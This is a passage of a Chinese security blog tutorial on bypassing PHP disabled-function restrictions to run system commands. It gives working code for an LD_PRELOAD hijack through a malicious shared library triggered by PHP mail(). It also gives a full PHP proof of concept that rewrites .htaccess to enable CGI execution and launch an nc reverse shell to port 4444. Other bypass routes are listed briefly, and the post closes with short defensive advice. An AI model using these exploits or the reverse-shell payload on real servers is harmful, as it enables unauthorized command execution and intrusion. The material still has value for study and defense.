+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"touch/var/www/html/test"</span>);</span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">geteuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">	unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">	payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当这个共享库中的geteuid被调用时，尝试加载payload()函数，执行命令，在/var/www/html目录下创建一个名字为test的文件。这里实际应用时应该注意编译平台和目标尽量相近，以及注意路径问题，避免不必要的麻烦，这里我们仅仅作为测试，不考虑这些问题。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> gcc -c -fPIC hack.c -o hack</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> gcc -shared hack -o hack.so</span></span><br></pre></td></tr></table></figure>
+
+<p>我们把hack.so放到WEB目录，然后编写一个PHP文件进行测试：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=/var/www/html/hack.so"</span>);</span><br><span class="line">mail(<span class="string">"[email protected]"</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们的/var/www/html/目录下本来只有hack.so和index.php这两个文件，当我们在浏览器中访问index.php页面之后，可以看到目录下又多出了一个test文件，说明我们的系统命令执行成功。（原作测试环境：VMPlayer7+CentOS7+Apache2.4+PHP7.2.4）</p>
+<p>这种绕过行为实施起来很简单，并且目前为止还不受PHP与Linux版本的限制，但是也很容易防御，只要禁用相关的函数（putenv）或者限制对环境变量的传递就可以了，但是要注意对现有业务是否造成影响。</p>
+<p><strong>四、.htaccess：不止重定向</strong></p>
+<p>大家对.htaccess文件一定不陌生，没错，在apache的WEB环境中，我们经常会使用.htaccess这个文件来确定某个目录下的URL重写规则，特别是一些开源的CMS或者框架当中经常会用到，比如著名的开源论坛discuz!，就可以通过.htaccess文件实现URL的静态化，大部分PHP框架，例如ThinkPHP和Laravel，在apache环境下会用.htaccess文件实现路由规则。但是如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令。</p>
+<p>关于mode_cgi，可以参考apache的官方说明：  <a href="http://man.chinaunix.net/newsoft/ApacheManual/mod/mod_cgi.html" target="_blank" rel="noopener">http://man.chinaunix.net/newsoft/ApacheManual/mod/mod_cgi.html</a> 。</p>
+<p>“任何具有mime类型application/x-httpd-cgi或者被 cgi-script处理器(Apache 1.1或以后版本)处理的文件将被作为CGI脚本对待并由服务器运行, 它的输出将被返回给客户端。通过两种途径使文件成为CGI脚本，或者文件具有已由 AddType指令定义的扩展名，或者文件位于 ScriptAlias目录中。”，这就表示，apache允许WEB服务器与可执行文件进行交互，这就意味着，你可以用C或者python编写WEB应用，听起来我们好像可以做任何apache权限用户能做的事情了，那么到底如何实现呢？</p>
+<p>首先需要满足几个条件，第一，必须是apache环境，第二，mod_cgi已经启用（在我的环境下是默认启用的），第三，必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none，第四，必须有权限写.htaccess文件。其实这几个条件还是比较容易满足的，满足了以上的条件，就可以“搞事情”了。</p>
+<p>在apache的配置中，有一个非常重要的指令，Options，Options指令是Apache配置文件中一个比较常见也比较重要的指令，Options指令可以在Apache服务器核心配置(server config)、虚拟主机配置(virtual host)、特定目录配置(directory)以及.htaccess文件中使用。Options指令的主要作用是控制特定目录将启用哪些服务器特性。关于Options指令后可以附加的特性选项的具体作用及含义，可以参考这篇文章： <a href="http://www.365mini.com/page/apache-options-directive.htm" target="_blank" rel="noopener">http://www.365mini.com/page/apache-options-directive.htm</a> ，当然我们用到的就是ExecCGI选项，表示允许使用mod_cgi模块执行CGI脚本。除了Options，我们还要配合另外一个AddHandler指令来使用，如果你对AddHandler不太熟悉没关系，这么解释一下就容易理解多了：AddType我们肯定很熟悉，比如配置apache对PHP的支持的时候，经常会添加一行类似AddTypeapplication/x-httpd-php .php这样的配置，这其实是指定了文件扩展名和内容类型之间的映射关系，而AddHandler则是指定扩展名和处理程序之间的关系，也就是说，可以指定某个特定的扩展名的文件，如何来进行处理。</p>
+<p>有了Options和AddHandler，我们就可以随便指定一个特定的文件扩展名以特定的程序来处理，这样思路就很清晰了：先把要执行的程序写入一个特定扩展名的文件里，然后修改.htaccess文件，通过Options指令允许使用mod_cgi模块执行CGI脚本，然后再让我们特定的扩展名以cgi-script进行处理，这样我们甚至可以反弹一个shell出来。</p>
+<p>POC如下，附注释：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">"nc -c'/bin/bash' 127.0.0.1 4444"</span>; <span class="comment">//反弹一个shell出来，这里用本地的4444端口</span></span><br><span class="line">$shellfile =<span class="string">"#!/bin/bash\n"</span>; <span class="comment">//指定shell</span></span><br><span class="line">$shellfile .=<span class="string">"echo -ne \"Content-Type: text/html\\n\\n\"\n"</span>; <span class="comment">//需要指定这个header，否则会返回500</span></span><br><span class="line">$shellfile .=<span class="string">"$cmd"</span>; </span><br><span class="line">functioncheckEnabled($text,$condition,$yes,$no) <span class="comment">//this surely can be shorter</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"$text: "</span> . ($condition ?$yes : $no) . <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'checked'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">  @file_put_contents(<span class="string">'.htaccess'</span>,<span class="string">"\nSetEnv HTACCESS on"</span>, FILE_APPEND); </span><br><span class="line">  header(<span class="string">'Location: '</span> . $_SERVER[<span class="string">'PHP_SELF'</span>]. <span class="string">'?checked=true'</span>); <span class="comment">//执行环境的检查</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  $modcgi = in_array(<span class="string">'mod_cgi'</span>,apache_get_modules()); <span class="comment">// 检测mod_cgi是否开启</span></span><br><span class="line">  $writable = is_writable(<span class="string">'.'</span>); <span class="comment">//检测当前目录是否可写</span></span><br><span class="line">  $htaccess = !<span class="keyword">empty</span>($_SERVER[<span class="string">'HTACCESS'</span>]);<span class="comment">//检测是否启用了.htaccess</span></span><br><span class="line">    checkEnabled(<span class="string">"Mod-Cgienabled"</span>,$modcgi,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">    checkEnabled(<span class="string">"Iswritable"</span>,$writable,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">    checkEnabled(<span class="string">"htaccessworking"</span>,$htaccess,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">  <span class="keyword">if</span>(!($modcgi &amp;&amp; $writable&amp;&amp; $htaccess))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Error. All of the above mustbe true for the script to work!"</span>; <span class="comment">//必须满足所有条件</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line"> checkEnabled(<span class="string">"Backing </span></span><br><span class="line"><span class="string">up.htaccess"</span>,copy(<span class="string">".htaccess"</span>,<span class="string">".htaccess.bak"</span>),<span class="string">"Suceeded!Saved in </span></span><br><span class="line"><span class="string">.htaccess.bak"</span>,<span class="string">"Failed!"</span>); <span class="comment">//备份一下原有.htaccess</span></span><br><span class="line">checkEnabled(<span class="string">"Write </span></span><br><span class="line"><span class="string">.htaccessfile"</span>,file_put_contents(<span class="string">'.htaccess'</span>,<span class="string">"Options </span></span><br><span class="line"><span class="string">+ExecCGI\nAddHandlercgi-script </span></span><br><span class="line"><span class="string">.dizzle"</span>),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>);<span class="comment">//.dizzle，我们的特定扩展名</span></span><br><span class="line">    checkEnabled(<span class="string">"Write shellfile"</span>,file_put_contents(<span class="string">'shell.dizzle'</span>,$shellfile),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>);<span class="comment">//写入文件</span></span><br><span class="line">    checkEnabled(<span class="string">"Chmod777"</span>,chmod(<span class="string">"shell.dizzle"</span>,<span class="number">0777</span>),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>);<span class="comment">//给权限</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Executing the script now.Check your listener &lt;img src = 'shell.dizzle' style ='display:none;'&gt;"</span>; <span class="comment">//调用</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在本地开nc监听4444端口，然后在浏览器中打开这个页面，如果执行成功，将会反弹一个shell到4444端口。</p>
+<p><strong>五、其他方式</strong></p>
+<p>除上述方式外，在某些特定情况下，还有很多能够绕过php.ini的禁用函数达到执行系统命令目的的方法，但是由于这些方法受到的限制颇多，很少有满足条件的真实环境，所以鉴于篇幅原因，以下只粗略介绍几个其他绕过方式，并提供相关的详细介绍的文章链接，如果有兴趣详细了解，可以参考互联网上的相关资料。</p>
+<p><strong>ImageMagick</strong></p>
+<p>ImageMagick是一款使用量很广的图片处理程序，很多厂商包括Discuz、Drupal、Wordpress等常用CMS中也调用了ImageMagick扩展或ImageMagick库进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。在ImageMagick6.9.3-9以前的所有版本中都存在一个漏洞，当用户传入一个包含『畸形内容』的图片的时候，就有可能触发命令注入，官方在6.9.3-9版本中对漏洞进行了不完全的修复。关于这个漏洞的具体利用和防御方式可以参考：</p>
+<p> <code>http://wooyun.jozxing.cc/static/drops/papers-15589.html</code>。</p>
+<p><strong>pcntl_exec</strong></p>
+<p>pcntl是linux下的一个扩展，可以支持php的多线程操作。很多时候会碰到禁用exec函数的情况，但如果运维人员安全意识不强或对PHP不甚了解，则很有可能忽略pcntl扩展的相关函数。</p>
+<p>COM <strong>组件</strong></p>
+<p>Windows环境下，当php.ini的设置项com.allow_dcom =true时，可以通过COM组件执行系统命令，甚至开启安全模式也可以，相关资料参考： <code>https://www.exploit-db.com/exploits/4553/</code>。</p>
+<p><strong>win32std</strong></p>
+<p>win32std是一个很老的PHP扩展，其中的win_shell_execute函数可以用来执行Windows系统命令：<code>https://www.exploit-db.com/exploits/4218/</code>。</p>
+<p><strong>六、总结</strong></p>
+<p>对于入侵者来说，拿到一个webshell之后，如果想要进一步获取更高的权限或更多的数据和信息，执行系统命令几乎是必须的。当我们在PHP应用中出现了某些纰漏导致遭到入侵时，如何让损失降到最低就成了首要的问题。从本文已经列举的方法中不难看出只要掌握了这些原理，防范工作是非常简单有效的，只要经常关注安全动态，是完全可以做到对以上绕过措施进行防御的。</p>
+
+      </div>
+      <div class="post-copyright">
+    <p class="copyright-item">
+      <span>原文作者: </span>
+      <a href="https://pwn4justice.github.io">pwn4justice</a>
+    </p>
+    <p class="copyright-item">
+      <span>原文链接: </span>
+      <a href="https://pwn4justice.github.io/2019/07/01/高危PHP函数/">https://pwn4justice.github.io/2019/07/01/高危PHP函数/</a>
+    </p>
+    <p class="copyright-item">
+      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
+    </p>
+  </div>
+      <footer class="post-footer">
+        
+        <nav class="post-nav"><a class="prev" href="/pwn4justice.github.io/2019/07/07/XPath-学习（一）/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">XPath 学习（一）</span>
+        <span class="prev-text nav-mobile">上一篇</span>
+      </a>
+    <a class="next" href="/pwn4justice.github.io/2019/06/29/BurpSuite-无法抓取本地DVWA数据包的解决方案/">
+        <span class="next-text nav-default">BurpSuite 无法抓取本地DVWA数据包的解决方案</span>
+        <span class="prev-text nav-mobile">下一篇</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div><div class="comments" id="comments"><div id="vcomments"></div>
+    </div></div>
+      </main>
+
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:bin.ring0@foxmail.com" class="iconfont icon-email" title="email"></a>
+        <a href="https://github.com/pwn4justice" class="iconfont icon-github" title="github"></a>
+        <a href="/pwn4justice.github.io/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://hexo.io/">Hexo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">&copy;2019<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">pwn4justice</span>
+  </span>
+</div>
+</footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div><!-- valine Comments: add by pwn4justice at 0:19 2019/7/15 -->
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.2.0/dist/Valine.min.js"></script>
+  <script type="text/javascript">
+	new Valine({
+		el: '#vcomments',
+		notify: false,
+		verify: false,
+		app_id: "c0QrSCsFudA3BmlYdMzo2VwF-MdYXbMMI",
+		app_key: "488SWS1mtwysEQnDRnqDDRXH",
+		placeholder: "Give me some advise ...",
+		avatar: 'mm',
+		visitor: true		<!-- add by me -->
+	});
+  </script>
+  <!-- origin value:"cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js" --><script type="text/javascript" src="/pwn4justice.github.io/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/pwn4justice.github.io/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/pwn4justice.github.io/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/pwn4justice.github.io/lib/pjax/jquery.pjax.min.js"></script>
+  <script type="text/javascript" src="/pwn4justice.github.io/lib/nprogress/nprogress.min.js"></script>
+  <script type="text/javascript" src="/pwn4justice.github.io/js/src/even.js?v=2.11.0"></script>
+</body>
+</html>
